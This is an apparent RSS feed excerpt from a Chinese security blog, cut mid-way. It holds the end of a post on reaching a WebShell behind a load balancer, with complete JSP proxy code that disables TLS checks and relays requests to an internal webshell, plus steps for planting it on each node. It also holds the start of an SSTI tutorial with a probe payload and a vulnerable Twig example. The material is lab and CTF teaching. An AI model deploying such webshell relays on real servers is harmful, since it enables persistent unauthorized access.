class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@ page contentType=&amp;quot;text/html;charset=UTF-8&amp;quot; language=&amp;quot;java&amp;quot; %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@ page import=&amp;quot;javax.net.ssl.*&amp;quot; %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@ page import=&amp;quot;java.io.ByteArrayOutputStream&amp;quot; %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@ page import=&amp;quot;java.io.DataInputStream&amp;quot; %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@ page import=&amp;quot;java.io.InputStream&amp;quot; %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@ page import=&amp;quot;java.io.OutputStream&amp;quot; %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@ page import=&amp;quot;java.net.HttpURLConnection&amp;quot; %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@ page import=&amp;quot;java.net.URL&amp;quot; %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@ page import=&amp;quot;java.security.KeyManagementException&amp;quot; %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@ page import=&amp;quot;java.security.NoSuchAlgorithmException&amp;quot; %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@ page import=&amp;quot;java.security.cert.CertificateException&amp;quot; %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@ page import=&amp;quot;java.security.cert.X509Certificate&amp;quot; %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  public static void ignoreSsl() throws Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        HostnameVerifier hv = new HostnameVerifier() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            public boolean verify(String urlHostName, SSLSession session) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                return true;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        trustAllHttpsCertificates();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        HttpsURLConnection.setDefaultHostnameVerifier(hv);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private static void trustAllHttpsCertificates() throws Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        TrustManager[] trustAllCerts = new TrustManager[] &amp;#123; new X509TrustManager() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            public X509Certificate[] getAcceptedIssuers() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                return null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            @Override&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                // Not implemented&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            @Override&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                // Not implemented&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            SSLContext sc = SSLContext.getInstance(&amp;quot;TLS&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            sc.init(null, trustAllCerts, new java.security.SecureRandom());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch (KeyManagementException e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            e.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch (NoSuchAlgorithmException e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            e.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        String target = &amp;quot;http://172.21.0.2:8080/ant.jsp&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        URL url = new URL(target);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (&amp;quot;https&amp;quot;.equalsIgnoreCase(url.getProtocol())) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ignoreSsl();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        HttpURLConnection conn = (HttpURLConnection)url.openConnection();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        StringBuilder sb = new StringBuilder();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        conn.setRequestMethod(request.getMethod());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        conn.setConnectTimeout(30000);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        conn.setDoOutput(true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        conn.setDoInput(true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        conn.setInstanceFollowRedirects(false);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        conn.connect();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ByteArrayOutputStream baos=new ByteArrayOutputStream();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        OutputStream out2 = conn.getOutputStream();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        DataInputStream in=new DataInputStream(request.getInputStream());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        byte[] buf = new byte[1024];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int len = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        while ((len = in.read(buf)) != -1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            baos.write(buf, 0, len);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        baos.flush();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        baos.writeTo(out2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        baos.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        InputStream inputStream = conn.getInputStream();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        OutputStream out3=response.getOutputStream();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int len2 = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        while ((len2 = inputStream.read(buf)) != -1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            out3.write(buf, 0, len2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        out3.flush();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        out3.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;a) 不要使用上传功能&lt;/strong&gt;，上传功能会分片上传，导致分散在不同 Node 上。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;b)&lt;/strong&gt; 要保证每一台 Node 上都有相同路径的 antproxy.jsp, 所以我疯狂保存了很多次，保证每一台都上传了脚本&lt;/p&gt;
&lt;p&gt;保存的一些小技巧&lt;/p&gt;
&lt;p&gt;比如像改修 127.21.0.3 变为 172.21.0.2，需要连续两次在同一个页面修改为.2，连续保存两次&lt;/p&gt;
&lt;p&gt;第二次修改的时候已经是.2 了，你先随便改改，然后改回.2 在保存，这样能省很多事&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 修改 Shell 配置，将 URL 部分填写为 antproxy.jsp 的地址，其它配置不变&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183112937.png&#34; alt=&#34;image-20221225183112937&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 测试执行命令，查看 IP&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183137011.png&#34; alt=&#34;image-20221225183137011&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到 IP 已经固定，意味着请求已经固定到了 LBSNode1 这台机器上了。此时使用分片上传、HTTP 代理，都已经跟单机的情况没什么区别了。&lt;/p&gt;
&lt;p&gt;Node1 和 Node2 交叉着访问 Node1 的 /ant.jsp 文件，符合 nginx 此时的 LBS 策略。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;优点：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;低权限就可以完成，如果权限高的话，还可以通过端口层面直接转发，不过这跟 Plan A 的关服务就没啥区别了&lt;/li&gt;
&lt;li&gt;流量上，只影响访问 WebShell 的请求，其它的正常业务请求不会影响。&lt;/li&gt;
&lt;li&gt;适配更多工具&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;缺点：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;该方案需要「目标 Node」和「其它 Node」 之间内网互通，如果不互通就凉了（敲黑板：加固方案快记下来）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你的蚁剑不能连接 jsp，那就升级～&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvNEJtel9mdXUweXJMTUsxb0JLS3RSQQ==&#34;&gt;负载均衡下的 WebShell 连接 (qq.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0FudFN3b3JkUHJvamVjdC9BbnRTd29yZC1MYWJz&#34;&gt;AntSwordProject/AntSword-Labs: Awesome environment for antsword tests (github.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl82MDcxOTc4MC9hcnRpY2xlL2RldGFpbHMvMTI4MjM5NzY3&#34;&gt;负载均衡反向代理下的 webshell_奋斗的小智的博客 - CSDN 博客&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/12/27/SSTI/</guid>
            <title>SSTI</title>
            <link>http://example.com/2022/12/27/SSTI/</link>
            <pubDate>Tue, 27 Dec 2022 13:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;ssti&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti&#34;&gt;#&lt;/a&gt; SSTI&lt;/h1&gt;
&lt;p&gt;SSTI 就是服务器端模板注入（Server-Side Template Injection）&lt;/p&gt;
&lt;p&gt;SSTI 是 CTF 的常客，在 PHP，java，python，甚至 go 中都存在 ssti，为了不再做爆零小笨蛋，本文准备结合 ctf+cms 深入了解一下 ssti&lt;/p&gt;
&lt;h2 id=&#34;模板引擎&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#模板引擎&#34;&gt;#&lt;/a&gt; 模板引擎&lt;/h2&gt;
&lt;p&gt;模板引擎（这里特指用于 Web 开发的模板引擎）是为了&lt;strong&gt;使用户界面与业务数据（内容）分离而产生的&lt;/strong&gt;，它可以生成特定格式的文档，利用模板引擎来生成前端的 html 代码，模板引擎会提供一套生成 html 代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板 + 用户数据的前端 html 页面，然后反馈给浏览器，呈现在用户面前。&lt;/p&gt;
&lt;p&gt;通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。&lt;/p&gt;
&lt;p&gt;后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的 HTML 字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。&lt;/p&gt;
&lt;p&gt;前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是 json 等数据包封装的数据，也可能是 html 代码，他都是由浏览器前端来解析渲染成 html 的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。&lt;/p&gt;
&lt;h2 id=&#34;ssti-模板注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti-模板注入&#34;&gt;#&lt;/a&gt; SSTI 模板注入&lt;/h2&gt;
&lt;p&gt;当前使用的一些框架，比如 python 的 flask，php 的 tp，java 的 spring 等一般都采用成熟的的 MVC 的模式，用户的输入先进入 Controller 控制器，然后根据请求类型和请求的指令发送给对应 Model 业务模型进行业务逻辑判断，数据库存取，最后把结果返回给 View 视图层，经过模板渲染展示给用户。因此 SSTI 存在于 MVC 模式当中的 View 层。&lt;/p&gt;
&lt;p&gt;漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。&lt;/p&gt;
&lt;p&gt;凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20200911174631687-758048107.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;其实 ctf 多做做就会发现最几年的出题趋势&lt;/p&gt;
&lt;p&gt;18，19 年 php 和 python ssti，一直到 2022 年的 go ssti&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203100847401.png&#34; alt=&#34;image-20221203100847401&#34;&gt;&lt;/p&gt;
&lt;p&gt;区别模板&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221202175327246.png&#34; alt=&#34;image-20221202175327246&#34;&gt;&lt;/p&gt;
&lt;p&gt;攻击 payload 构造&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;毕竟渗透测试，对于所有渗透测试也都是适用的。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;先从探测漏洞 --&amp;gt; 证明存在该漏洞 --&amp;gt; 漏洞的进一步利用&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;模板引擎会自动执行数学运算，所以如果我们输入一个运算，例如&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://111.com/?username=$&amp;#123;7*7&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果模板引擎最后返回 Hello 49 则说明存在 SSTI 漏洞。&lt;/p&gt;
&lt;h2 id=&#34;php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php&#34;&gt;#&lt;/a&gt; PHP&lt;/h2&gt;
&lt;h3 id=&#34;twig&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#twig&#34;&gt;#&lt;/a&gt; twig&lt;/h3&gt;
&lt;p&gt;Twig 是来自于 Symfony 的模板引擎，它非常易于安装和使用。它的操作有点像 Mustache 和 liquid。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;　　require_once dirname(__FILE__).&amp;#x27;\twig\lib\Twig\Autoloader.php&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;　　Twig_Autoloader::register(true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;　　$twig = new Twig_Environment(new Twig_Loader_String());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;　　$output = $twig-&amp;gt;render(&amp;quot;Hello &amp;#123;&amp;#123;name&amp;#125;&amp;#125;&amp;quot;, array(&amp;quot;name&amp;quot; =&amp;gt; $_GET[&amp;quot;name&amp;quot;]));  // 将用户输入作为模版变量的值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;　　echo $output;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Twig 使用一个加载器 loader (Twig_Loader_Array) 来定位模板，以及一个环境变量 environment (Twig_Environment) 来存储配置信息。&lt;/p&gt;
&lt;p&gt;其中，render () 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。&lt;/p&gt;
&lt;p&gt;使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于 GET 请求参数 $_GET [“name”] 。&lt;/p&gt;
